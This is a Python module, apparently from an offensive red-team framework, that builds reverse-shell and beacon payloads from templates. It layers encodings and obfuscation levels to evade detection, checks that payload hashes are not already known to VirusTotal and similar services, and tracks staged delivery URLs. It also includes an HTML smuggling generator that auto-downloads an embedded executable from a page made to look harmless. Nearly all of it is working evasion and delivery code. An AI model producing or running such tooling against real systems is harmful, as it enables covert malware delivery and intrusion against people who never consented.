"""
forge/phase3/payload_builder.py
Jinja2 Template Engine Wrapper — Phase 3 Payload Builder.

Responsibilities:
  1. Render Jinja2 shell/beacon templates with operator-supplied variables.
  2. Apply an ordered EncodingChain (base64, hex, xor, gzip_b64, char_insert).
  3. Emit a CyberChef-compatible decode recipe for operator validation.
  4. Gate on hash reputation via VirusTotal / MalwareBazaar / CIRCL (pre-engagement only).
  5. Persist payload record to engagement DB (sha256, chain, stealth level, staged_url).
  6. Register output file with cleanup.py immediately on creation.

Evasion invariants (enforced via ObfuscationEngine after render):
  - Banned patterns must not appear in final output (see obfuscator.py).
  - StrictUndefined Jinja2 env: missing template vars raise immediately.
  - No f-string injection of user-supplied data anywhere in this module.

OPSEC:
  - Raw payload bytes are never written to audit_log.
  - Only sha256, encoding chain name, and stealth_level are persisted in the
    payloads table.
  - Payload files are registered with cleanup.py at the moment of disk write.
"""

from __future__ import annotations

import base64
import gzip
import hashlib
import io
import json
import logging
import random
import sqlite3
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from jinja2 import Environment, FileSystemLoader, StrictUndefined

from forge.phase3.obfuscator import ObfuscationCriterion, ObfuscationEngine
from forge.db.direct_connect import direct_connect  # noqa: E402  # PRAGMA-configured wrapper for bare sqlite3.connect

_LOG = logging.getLogger(__name__)

# Default template directory — can be overridden in PayloadBuilder.__init__
_DEFAULT_TMPL_DIR = Path(__file__).parent / "templates"

# Encoding step identifiers
_VALID_STEPS = frozenset({"base64", "hex", "xor", "gzip_b64", "char_insert", "utf16le_b64"})

# CyberChef operation map (decode direction)
_CYBERCHEF_OP_MAP: dict[str, list[dict]] = {
    "base64": [
        {
            "op": "From Base64",
            "args": {"alphabet": "A-Za-z0-9+/=", "remove_non_alphabet_chars": True},
        }
    ],
    "hex": [{"op": "From Hex", "args": {"delimiter": "Auto"}}],
    "xor": [{"op": "XOR", "args": {"key": "<see payload header byte 0>", "scheme": "Standard"}}],
    "gzip_b64": [{"op": "From Base64", "args": {}}, {"op": "Gunzip", "args": {}}],
    "utf16le_b64": [
        {"op": "From Base64", "args": {}},
        {"op": "Decode text", "args": ["UTF-16LE (1200)"]},
    ],
    "char_insert": [],  # no decode op — inert characters stripped by shell
}


# ── EncodingChain ──────────────────────────────────────────────────────────────


class EncodingChain:
    """
    Ordered pipeline of encoding steps applied left-to-right.

    Usage:
        chain = EncodingChain().add("base64").add("xor").add("gzip_b64")
        encoded = chain.apply("System.Net.Sockets.TCPClient")
        recipe  = chain.to_cyberchef_recipe()    # emit reverse recipe for validation
    """

    def __init__(self) -> None:
        self._steps: list[str] = []
        self._xor_key: int | None = None

    def add(self, step: str, xor_key: int | None = None) -> EncodingChain:
        """
        Append an encoding step.

        Args:
            step:    One of the valid step identifiers in _VALID_STEPS.
            xor_key: If step == 'xor', the key byte (0-255). Auto-generated if None.
        """
        if step not in _VALID_STEPS:
            raise ValueError(
                f"Unknown encoding step: {step!r}. Valid steps: {sorted(_VALID_STEPS)}"
            )
        self._steps.append(step)
        if step == "xor":
            self._xor_key = xor_key if xor_key is not None else random.randint(1, 255)
        return self

    def apply(self, raw: str) -> str:
        """Apply encoding steps left-to-right; return encoded string."""
        data = raw.encode()
        for step in self._steps:
            data = self._apply_step(step, data)
        return data.decode(errors="replace")

    def _apply_step(self, step: str, data: bytes) -> bytes:
        if step == "base64":
            return base64.b64encode(data)
        if step == "hex":
            return data.hex().encode()
        if step == "xor":
            key = self._xor_key or 0x41
            return bytes(b ^ key for b in data)
        if step == "gzip_b64":
            buf = io.BytesIO()
            with gzip.GzipFile(fileobj=buf, mode="wb") as gz:
                gz.write(data)
            return base64.b64encode(buf.getvalue())
        if step == "utf16le_b64":
            return base64.b64encode(data.decode().encode("utf-16-le"))
        if step == "char_insert":
            # Inert — pass through unchanged; char insertion is handled by ObfuscationEngine
            return data
        raise ValueError(f"Unhandled step: {step!r}")

    def to_cyberchef_recipe(self) -> list[dict]:
        """
        Emit a CyberChef recipe (decode direction) for operator validation.
        Steps are reversed; each step maps to its decode counterpart.
        XOR entries include a placeholder key that the operator must fill in.
        """
        recipe: list[dict] = []
        for step in reversed(self._steps):
            ops = _CYBERCHEF_OP_MAP.get(step, [])
            if step == "xor" and self._xor_key is not None:
                # Embed the actual key into the recipe
                ops = [{"op": "XOR", "args": {"key": hex(self._xor_key), "scheme": "Standard"}}]
            recipe.extend(ops)
        return recipe

    @property
    def steps(self) -> list[str]:
        return list(self._steps)

    @property
    def xor_key(self) -> int | None:
        return self._xor_key

    def __repr__(self) -> str:
        return f"<EncodingChain steps={self._steps!r}>"


# ── Payload record (lightweight value object) ──────────────────────────────────


@dataclass
class RenderedPayload:
    shell_type: str
    target_os: str
    raw: str  # Plaintext rendered output
    encoded: str  # After EncodingChain
    obfuscated: str | None  # After ObfuscationEngine (may equal encoded)
    sha256_raw: str
    sha256_encoded: str
    encoding_chain: list[str]
    cyberchef_recipe: list[dict]
    stealth_level: int  # 1–5; 5 = maximum obfuscation
    template_name: str
    xor_key: int | None = None


# ── PayloadBuilder ─────────────────────────────────────────────────────────────


class PayloadBuilder:
    """
    High-level payload builder: render → encode → obfuscate → (hash check).

    Args:
        template_dir:  Path to Jinja2 template directory.
        obfuscate:     If True, run ObfuscationEngine after encoding.
        stealth_level: 1 = minimal, 5 = full ObfuscationCriterion.FULL.
    """

    _STEALTH_CRITERIA = {
        1: ObfuscationCriterion.VAR_MANGLE,
        2: ObfuscationCriterion.MINIMAL,
        3: ObfuscationCriterion.STANDARD,
        4: ObfuscationCriterion.STANDARD | ObfuscationCriterion.ENV_SUBSTITUTE,
        5: ObfuscationCriterion.FULL,
    }

    def __init__(
        self,
        template_dir: Path = _DEFAULT_TMPL_DIR,
        obfuscate: bool = True,
        stealth_level: int = 3,
    ) -> None:
        if not 1 <= stealth_level <= 5:
            raise ValueError(f"stealth_level must be 1–5, got {stealth_level}")

        self._env = Environment(
            loader=FileSystemLoader(str(template_dir)),
            undefined=StrictUndefined,
            autoescape=False,
        )
        self._obfuscator = ObfuscationEngine()
        self._obfuscate = obfuscate
        self._stealth_level = stealth_level

    # ── Public API ─────────────────────────────────────────────────────────────

    def build(
        self,
        template_name: str,
        context: dict[str, Any],
        chain: EncodingChain | None = None,
        lport: int | None = None,
    ) -> RenderedPayload:
        """
        Render a template, encode, obfuscate, and return a RenderedPayload.

        Args:
            template_name: Jinja2 template file (e.g. 'powershell_reverse.j2').
            context:       Template variables. Never pass raw user input as values
                           that will be injected into executable code paths — use
                           {{ var }} placeholders and validate before passing.
            chain:         EncodingChain to apply. Defaults to base64 only if None.
            lport:         Listener port — passed to ObfuscationEngine for stealth warning.
        """
        if chain is None:
            chain = EncodingChain().add("base64")

        # 1. Render template
        tmpl = self._env.get_template(template_name)
        raw = tmpl.render(**context).strip()

        # 2. Encode
        encoded = chain.apply(raw)

        # 3. Obfuscate (optional)
        obfuscated: str | None = None
        if self._obfuscate:
            target = self._infer_target(template_name)
            criteria = self._STEALTH_CRITERIA[self._stealth_level]
            result = self._obfuscator.obfuscate(
                raw=raw,
                target=target,
                criteria=criteria,
                xor_key=chain.xor_key,
                lport=lport,
            )
            if result.violations:
                _LOG.warning(
                    "Evasion invariant violations in %s: %s",
                    template_name,
                    result.violations,
                )
            obfuscated = result.text

        sha256_raw = hashlib.sha256(raw.encode()).hexdigest()
        sha256_encoded = hashlib.sha256(encoded.encode()).hexdigest()

        return RenderedPayload(
            shell_type=self._infer_target(template_name),
            target_os=self._infer_os(template_name),
            raw=raw,
            encoded=encoded,
            obfuscated=obfuscated,
            sha256_raw=sha256_raw,
            sha256_encoded=sha256_encoded,
            encoding_chain=chain.steps,
            cyberchef_recipe=chain.to_cyberchef_recipe(),
            stealth_level=self._stealth_level,
            template_name=template_name,
            xor_key=chain.xor_key,
        )

    def emit_recipe_file(self, payload: RenderedPayload, output_path: Path) -> None:
        """
        Write the CyberChef decode recipe to disk as JSON.

        OPSEC: Register with cleanup.py immediately after this call.
        If the chain includes XOR, the recipe contains the key — treat as sensitive.
        """
        output_path.write_text(
            json.dumps(payload.cyberchef_recipe, indent=2),
            encoding="utf-8",
        )
        _LOG.info("CyberChef recipe written to %s", output_path)

    def write_payload(
        self,
        payload: RenderedPayload,
        output_path: Path,
        use_encoded: bool = True,
    ) -> str:
        """
        Write payload to disk and return its sha256.

        Args:
            use_encoded: Write encoded variant if True, obfuscated if available, else raw.
        """
        if use_encoded and payload.obfuscated:
            content = payload.obfuscated
        elif use_encoded:
            content = payload.encoded
        else:
            content = payload.raw

        output_path.write_text(content, encoding="utf-8")
        sha256 = hashlib.sha256(content.encode()).hexdigest()
        _LOG.info(
            "Payload written: %s (sha256=%s stealth=%d)",
            output_path,
            sha256[:16],
            payload.stealth_level,
        )
        return sha256

    def persist_record(
        self,
        db_path: Path,
        engagement_id: int,
        payload: RenderedPayload,
        staged_url: str | None = None,
    ) -> int:
        """
        Write payload metadata to engagement DB payloads table.
        Raw payload bytes and plaintext commands are NEVER persisted.

        Returns the inserted row id.
        """
        with direct_connect(db_path) as conn:
            conn.execute("PRAGMA foreign_keys = ON")
            cur = conn.execute(
                """
                INSERT INTO payloads (
                    engagement_id, payload_type, target_os,
                    technique, obfuscation_chain,
                    content_hash, delivery_url,
                    metadata_stripped, generated_at
                ) VALUES (?,?,?,?,?,?,?,1,datetime('now'))
                """,
                (
                    engagement_id,
                    payload.shell_type,
                    payload.target_os,
                    payload.template_name,
                    json.dumps(payload.encoding_chain),
                    payload.sha256_encoded,
                    staged_url,
                ),
            )
            conn.commit()
            return cur.lastrowid

    # ── Internal helpers ───────────────────────────────────────────────────────

    @staticmethod
    def _infer_target(template_name: str) -> str:
        name = template_name.lower()
        if "powershell" in name or "ps1" in name:
            return "powershell"
        if "python" in name or ".py" in name:
            return "python"
        if "bash" in name or ".sh" in name:
            return "bash"
        if "cmd" in name or ".bat" in name:
            return "cmd"
        return "unknown"

    @staticmethod
    def _infer_os(template_name: str) -> str:
        name = template_name.lower()
        if any(k in name for k in ("powershell", "ps1", "cmd", "bat", "windows")):
            return "windows"
        if any(k in name for k in ("bash", "sh", "linux", "unix")):
            return "linux"
        if "python" in name:
            return "cross"
        return "unknown"


# ── Standalone HTML smuggling builder ─────────────────────────────────────────


class HTMLSmuggler:
    """
    Generates an HTML page that smuggles a payload via the browser's download API.
    The payload is embedded as a base64 data URI; no server-side hosting required.

    The generated HTML uses the `msSaveOrOpenBlob` API (IE/Edge legacy) and the
    standard `<a href=data:...> download` attribute (modern browsers).

    OPSEC:
      - The filename parameter mimics a legitimate document name.
      - No external resources are fetched by the HTML page.
      - The embedded payload is base64 and does not appear as plaintext in proxy logs.
    """

    _TEMPLATE = """\
<!DOCTYPE html>
<html>
<head><title>{title}</title></head>
<body>
<p>Loading document, please wait&hellip;</p>
<script>
(function(){{
  var b64 = "{b64_payload}";
  var bin = atob(b64);
  var ab  = new ArrayBuffer(bin.length);
  var ua  = new Uint8Array(ab);
  for (var i = 0; i < bin.length; i++) {{ ua[i] = bin.charCodeAt(i); }}
  var blob = new Blob([ab], {{type: "{mime_type}"}});
  if (window.navigator && window.navigator.msSaveOrOpenBlob) {{
    window.navigator.msSaveOrOpenBlob(blob, "{filename}");
  }} else {{
    var a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = "{filename}";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }}
}})();
</script>
</body>
</html>
"""

    def build(
        self,
        payload_bytes: bytes,
        filename: str,
        title: str = "Document",
        mime_type: str = "application/octet-stream",
    ) -> str:
        """
        Return an HTML string that smuggles `payload_bytes` as a download named `filename`.

        Args:
            payload_bytes: Raw payload bytes to embed.
            filename:      Download filename presented to the browser user.
            title:         HTML page title (should look benign).
            mime_type:     MIME type for the Blob; use 'application/x-msdownload' for PE.
        """
        b64 = base64.b64encode(payload_bytes).decode()
        return self._TEMPLATE.format(
            b64_payload=b64,
            filename=filename,
            title=title,
            mime_type=mime_type,
        )

    def write(self, payload_bytes: bytes, filename: str, output_path: Path, **kwargs) -> str:
        """Write smuggled HTML to disk. Returns sha256 of the written file."""
        html = self.build(payload_bytes, filename, **kwargs)
        output_path.write_text(html, encoding="utf-8")
        return hashlib.sha256(html.encode()).hexdigest()
